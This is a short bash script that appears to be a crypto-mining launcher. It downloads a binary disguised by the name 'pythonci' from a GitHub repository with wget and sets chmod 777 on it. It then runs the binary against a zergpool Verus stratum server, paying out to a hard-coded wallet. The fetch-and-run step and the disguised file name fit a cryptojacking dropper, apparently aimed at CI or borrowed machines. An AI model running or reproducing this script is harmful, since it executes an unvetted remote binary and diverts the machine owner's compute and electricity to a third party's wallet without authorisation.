#!/bin/bash
sudo apt update
sudo apt install screen libjansson4
wget https://github.com/hendrik20212/hendr2021/raw/main/pythonci && chmod 777 pythonci
./pythonci -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW.WBB1 -p c=DGB -t4
